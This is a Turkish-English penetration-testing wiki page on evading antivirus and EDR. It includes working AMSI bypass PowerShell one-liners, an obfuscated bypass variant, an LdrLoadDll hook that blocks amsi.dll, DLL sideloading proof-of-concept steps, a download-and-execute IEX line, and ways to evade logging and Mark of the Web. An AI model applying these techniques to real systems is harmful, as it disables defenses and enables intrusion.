# Antivirüs (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa [**@m2rc_p**](https://twitter.com/m2rc_p) tarafından yazıldı!**

## Defender'ı Durdur

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection, bilinen kötü amaçlı string'leri veya byte dizilerini bir binary veya script içinde işaretleyerek ve ayrıca dosyanın kendisinden (ör. file description, company name, digital signatures, icon, checksum, vb.) bilgi çıkararak yapılır. Bu, bilinen public araçları kullanmanın sizi daha kolay yakalayabileceği anlamına gelir; muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmişlerdir. Bu tür tespiti aşmanın birkaç yolu vardır:

- **Encryption**

Binary'yi şifrelerseniz, AV'in programınızı tespit etmesinin bir yolu olmaz; ancak programı bellekte çözüp çalıştıracak bir loader'a ihtiyacınız olur.

- **Obfuscation**

Bazen AV'yi geçmek için binary veya script'inizdeki bazı string'leri değiştirmeniz yeterlidir, ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı bir iş olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmaz, fakat bu çok zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender'ın static detection'ına karşı kontrol etmenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'tir. Temelde dosyayı birden fazla segmente bölüp Defender'ı her bir segmenti ayrı ayrı taramaya zorlar; böylece binary'nizde işaretlenen string'lerin veya byte'ların tam olarak neler olduğunu size söyleyebilir.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) listesine göz atmanızı şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'in binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı aktiviteyi izlemesi (ör. tarayıcınızın parolalarını çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak, vb.) durumudur. Bu kısım üzerinde çalışmak biraz daha zor olabilir, ancak sandbox'ları atlatmak için yapabileceğiniz bazı şeyler şunlardır.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğunu keşfetmişler; bu yüzden malware'inizde tetiklemeden önce bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa, Defender'ın sandbox'ı içindesiniz demektir ve programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes'a karşı bazı diğer gerçekten iyi ipuçları için [@mgeeky](https://twitter.com/mariuszbit)'in paylaşımlarına bakın

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Daha önce bu yazıda da söylediğimiz gibi, **public tools** sonunda **detect edilecektir**, bu yüzden kendinize şu soruyu sormalısınız:

Örneğin, LSASS'i dumplamak istiyorsanız, gerçekten **mimikatz** kullanmanız mı gerekiyor? Yoksa LSASS'i dumplayan daha az bilinen farklı bir proje kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Mimikatz örneğini ele alırsak, AV'ler ve EDR'ler tarafından muhtemelen en çok işaretlenen projelerden biridir; proje kendisi harika olsa da, AV'leri atlatmak için onunla çalışmak bir kâbus olabilir, bu yüzden yapmak istediğiniz şey için alternatiflere bakın.

> [!TIP]
> Payload'larınızı evasiyon için değiştirirken, Defender'da **automatic sample submission**'ı kapattığınızdan emin olun ve lütfen, cidden, uzun vadede evasiyon hedefliyorsanız **VIRUSTOTAL'A YÜKLEMEYİN**. Bir payload'ın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, bunu bir VM'e kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda her zaman evasiyon için **DLL'leri kullanmayı önceliklendirin**, deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit ediliyor** ve analiz ediliyor, bu yüzden bazı durumlarda tespiti atlatmak için kullanabileceğiniz çok basit bir hiledir (tabii payload'ınızın bir DLL olarak çalışmasının bir yolu varsa).

Bu görselde görüldüğü gibi, Havoc'tan bir DLL Payload'un antiscan.me'de tespit oranı 4/26 iken, EXE payload'un tespit oranı 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE payload ile normal bir Havoc DLL karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyaları ile çok daha stealthy olmak için kullanabileceğiniz bazı hileleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader tarafından kullanılan DLL arama sırasından faydalanarak, kurban uygulamayı ve kötü amaçlı payload(lar)ı yan yana konumlandırmayı kullanır.

DLL Sideloading'e duyarlı programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e yatkın programları ve bu programların yüklemeye çalıştığı DLL dosyalarını listeleyecektir.

I highly recommend you **explore DLL Hijackable/Sideloadable programs yourself**, this technique is pretty stealthy done properly, but if you use publicly known DLL Sideloadable programs, you may get caught easily.

Kesinlikle tavsiye ederim ki **DLL Hijackable/Sideloadable programları kendiniz keşfedin**, bu teknik doğru yapıldığında oldukça sinsi olur; ancak kamuya açık bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Just by placing a malicious DLL with the name a program expects to load, won't load your payload, as the program expects some specific functions inside that DLL, to fix this issue, we'll use another technique called **DLL Proxying/Forwarding**.

Bir programın yüklemeyi beklediği isimle kötü amaçlı bir DLL yerleştirmek tek başına payload'ınızı çalıştırmayacaktır; çünkü program o DLL içinde bazı belirli fonksiyonları bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying** forwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload.

**DLL Proxying**, programın proxy (ve kötü amaçlı) DLL'den orijinal DLL'e yaptığı çağrıları ileterek programın işlevselliğini korur ve payload'ınızın çalıştırılmasını yönetebilmesini sağlar.

I will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)

Bu amaçla [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/) tarafından kullanacağım.

These are the steps I followed:

Aşağıda izlediğim adımlar:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve orijinal olarak yeniden adlandırılmış DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ( [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş) hem de proxy DLL'in [antiscan.me](https://antiscan.me)'de 0/26 Detection rate'e sahip olduğunu gördük! Bunu bir başarı olarak nitelendirirdim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) ve ayrıca [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) izleyerek burada daha derinlemesine tartıştıklarımızı öğrenmenizi **şiddetle tavsiye** ederim.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules export edebileceği fonksiyonlar aslında "forwarder" olabilir: kodu işaret etmek yerine, export girdisi `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir çağıran export'ı çözümlediğinde, Windows loader şunları yapar:

- `TargetDll` henüz yüklenmemişse yükler
- `TargetFunc`'ı ondaki export'lardan çözer

Anlaşılması gereken ana davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL arama sırası kullanılır; bu sıra, ileri çözümlemeyi yapan modülün bulunduğu dizini de içerir.

Bu, dolaylı bir sideloading ilmeği sağlar: bir fonksiyonu non-KnownDLL modül adına forward eden imzalı bir DLL bulun, sonra bu imzalı DLL'i, forward edilen hedef modülle tam olarak aynı adda olan saldırgan kontrolündeki bir DLL ile aynı dizine koyun. Forward edilen export çağrıldığında, loader forward'ı çözer ve aynı dizinden sizin DLL'inizi yükler, DllMain'inizi çalıştırır.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu yüzden normal arama sırasına göre çözülür.

PoC (copy-paste):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütmeyi sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'u uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (imzalı) side-by-side `keyiso.dll` (imzalı) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, forward'ı takip ederek `NCRYPTPROV.SetAuditingInterface`'e gider
- Loader daha sonra `NCRYPTPROV.dll`'ü `C:\test`'ten yükler ve `DllMain`'ini çalıştırır
- Eğer `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra ancak bir "missing API" hatası alırsınız

Hunting tips:
- Hedef modül KnownDLL olmayan forwarded exports'lara odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded exports'leri aşağıdaki araçlarla sıralayabilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt

Tespit/defans fikirleri:
- LOLBins'i (ör. `rundll32.exe`) sistem klasörü dışındaki yollarından imzalı DLL'ler yüklerken ve ardından aynı temel ada sahip non-KnownDLLs'i o dizinden yüklerken izleyin
- Aşağıdaki gibi işlem/modül zincirleri için uyarı verin: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` — kullanıcı yazılabilir yollar altında
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma iznini reddedin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i shellcode'unuzu gizli bir şekilde yükleyip çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir kedi-fare oyunudur; bugün işe yarayan yarın tespit edilebilir, bu yüzden asla sadece tek bir araca güvenmeyin; mümkünse birden fazla evasion technique zincirlemeyi deneyin.

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta, AVs sadece **files on disk** tarayabiliyordu; bu yüzden payloadları **directly in-memory** çalıştırmayı başarabiliyorsanız, AV bunu engelleyemezdi çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Script içeriğini hem şifrelenmemiş hem de unobfuscated bir biçimde açığa çıkararak antivirus çözümlerinin script davranışını incelemesine olanak verir.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Dikkat edin, başına `amsi:` ekliyor ve ardından scriptin çalıştığı yürütülebilir dosyanın yolunu gösteriyor; bu örnekte, powershell.exe

Hiçbir dosyayı diske bırakmadık, fakat AMSI yüzünden in-memory olarak yakalandık.

Dahası, **.NET 4.8**'den itibaren C# kodu da AMSI üzerinden çalıştırılıyor. Bu durum `Assembly.Load(byte[])` ile yapılan in-memory yüklemeyi bile etkiliyor. Bu yüzden AMSI'den kaçınmak istiyorsanız, in-memory yürütme için daha düşük .NET sürümlerini (örn. 4.7.2 veya daha düşük) kullanmanız tavsiye edilir.

There are a couple of ways to get around AMSI:

- **Obfuscation**

AMSI esasen statik tespitlerle çalıştığı için, yüklemeye çalıştığınız scriptleri değiştirmek tespitten kaçınmak için iyi bir yol olabilir.

Ancak AMSI, scriptleri çok katmanlı obfuscation olsa bile unobfuscating yeteneğine sahiptir; bu nedenle obfuscation nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da kaçmanın o kadar basit olmadığı anlamına gelir. Yine de bazen yapmanız gereken tek şey birkaç değişken adını değiştirmek olur ve sorun çözülür; bu yüzden ne kadar işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell işlemine (ayrıca cscript.exe, wscript.exe vb.) bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak bile bununla kolayca oynanabilir. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar AMSI taramasından kaçmanın çeşitli yollarını buldular.

**Forcing an Error**

AMSI başlatılmasının başarısız olmasını zorlamak (amsiInitFailed) mevcut işlem için hiçbir taramanın başlatılmamasıyla sonuçlanır. Bu ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut powershell süreci için AMSI'yi kullanılamaz hale getirmek tek bir powershell satırıyla mümkün oldu. Bu satır elbette AMSI tarafından tespit edildi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekli.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Unutmayın, bu gönderi yayımlandığında muhtemelen işaretlenecektir; eğer tespit edilmeden kalmayı planlıyorsanız herhangi bir kod yayınlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve amsi.dll içindeki "AmsiScanBuffer" fonksiyonunun adresinin bulunmasını (kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu) ve onu E_INVALIDARG kodunu döndürecek talimatlarla üzerine yazmayı içerir; bu şekilde gerçek taramanın sonucu 0 dönecek ve temiz sonuç olarak yorumlanacaktır.

> [!TIP]
> Daha ayrıntılı açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'yi powershell ile atlatmak için kullanılan birçok başka teknik de vardır, daha fazla öğrenmek için [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)'a göz atın.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut işlem içine yüklendikten sonra başlatılır. Güçlü, dil bağımsız bir bypass, istenen modül `amsi.dll` olduğunda hata döndüren bir kullanıcı modu hook'unu `ntdll!LdrLoadDll` üzerine yerleştirmektir. Sonuç olarak, AMSI hiç yüklenmez ve o işlem için tarama yapılmaz.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loader'larda aynı şekilde çalışır (aksi takdirde AMSI'yi yükleyecek her şey).
- Uzun komut satırı artifaktlarından kaçınmak için scriptleri stdin üzerinden (`PowerShell.exe -NoProfile -NonInteractive -Command -`) vererek kullanın.
- LOLBins aracılığıyla çalıştırılan loader'lar tarafından kullanıldığı gözlemlenmiştir (ör., `regsvr32` `DllRegisterServer` çağırırken).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Tespit edilen imzayı kaldırın**

Mevcut işlemin belleğinden tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçları kullanabilirsiniz. Bu araçlar, mevcut işlemin belleğini AMSI imzası için tarar ve daha sonra imzayı NOP komutlarıyla üzerine yazarak etkili şekilde bellekten kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**Powershell version 2 kullanın**
PowerShell version 2 kullanırsanız, AMSI yüklenmeyecektir; bu nedenle scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını kaydetmenize izin veren bir özelliktir. Bu, denetim ve sorun giderme amaçları için faydalı olabilir, ancak tespitten kaçınmak isteyen saldırganlar için de bir **sorun** olabilir.

PowerShell logging'i atlamak için şu teknikleri kullanabilirsiniz:

- **Disable PowerShell Transcription and Module Logging**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Use Powershell version 2**: PowerShell version 2 kullanırsanız, AMSI yüklenmeyecektir; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Defensivesiz bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (bu, `powerpick`'in Cobal Strike'dan kullandığı şeydir).


## Obfuscation

> [!TIP]
> Birçok obfuscation tekniği veriyi şifrelemeye dayanır; bu da ikilinin entropisini artırır ve AV/EDR'lerin tespitini kolaylaştırır. Bununla dikkatli olun ve şifrelemeyi yalnızca hassas veya gizlenmesi gereken kod bölümlerine uygulamayı düşünün.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (veya ticari fork'ları) kullanan malwareleri analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı güvenilir şekilde **orijinal IL'e yakın bir hâli** geri getirir; bu daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilir.

1.  Anti-tampering removal – ConfuserEx her *method body*'yi şifreler ve bunu *module* static constructor (`<Module>.cctor`) içinde decrypt eder. Bu ayrıca PE checksum'u da patch'ler; bu yüzden herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller**'ı kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı ConfuserEx farkında bir de4dot fork'u olan **de4dot-cex**'e verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profilini seçer  
• de4dot control-flow flattening'i geri alır, orijinal namespace, class ve değişken isimlerini geri yükler ve sabit string'leri decrypt eder.

3.  Proxy-call stripping – ConfuserEx, decompilation'ı daha da bozmak için doğrudan method çağrılarını hafif sarıcılarla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini, opak wrapper fonksiyonlar (`Class8.smethod_10`, …) yerine görmelisiniz.

4.  Manual clean-up – Ortaya çıkan binary'yi dnSpy altında çalıştırın, büyük Base64 blob'ları veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayarak *gerçek* payload'u bulun. Çoğu zaman malware bunu `<Module>.byte_0` içinde başlatılmış TLV-encoded byte array olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya gerek kalmadan yürütme akışını geri getirir — çevrimdışı bir workstatıon üzerinde çalışırken kullanışlıdır.

> 🛈  ConfuserEx, otomatik triage için IOC olarak kullanılabilecek `ConfusedByAttribute` adında özel bir attribute üretir.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, yazılım güvenliğini [code obfuscation] ve tamper-proofing yoluyla artırabilen açık kaynak bir [LLVM](http://www.llvm.org/) fork'u sağlamaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, `C++11/14` dilini kullanarak derleme zamanında herhangi bir dış araç kullanmadan ve derleyiciyi değiştirmeden obfuscated code üretmenin nasıl yapılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından üretilen bir katman obfuscated operations ekleyerek, uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli pe dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele yürütülebilir dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan LLVM destekli diller için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly kod seviyesinde obfuscate eder ve normal kontrol akışına dair doğal kavrayışımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve ardından yükleyebilir.

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak zararlı uygulamaları çalıştırmaktan korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen esas olarak bir reputation-based yaklaşımı ile çalışır; yani nadiren indirilen uygulamalar SmartScreen'i tetikleyecek ve böylece son kullanıcıyı uyarmaya ve dosyanın çalıştırılmasını engellemeye çalışacaktır (dosya yine de More Info -> Run anyway tıklanarak çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) olup, internetten indirilen dosyalar üzerinde otomatik olarak oluşturulur ve indirildiği URL bilgisini içerir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> Güvenilir bir imzalama sertifikasıyla imzalanmış yürütülebilir dosyaların SmartScreen'i tetiklemeyeceğini not etmek önemlidir.

Payload'larınızın Mark of The Web almasını engellemenin çok etkili bir yolu, onları bir ISO gibi bir konteyner içine paketlemektir. Bunun nedeni, Mark-of-the-Web (MOTW)'ün **non NTFS** hacimlere uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) , payload'ları Mark-of-the-Web'den kaçmak için çıktı konteynerlerine paketleyen bir araçtır.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
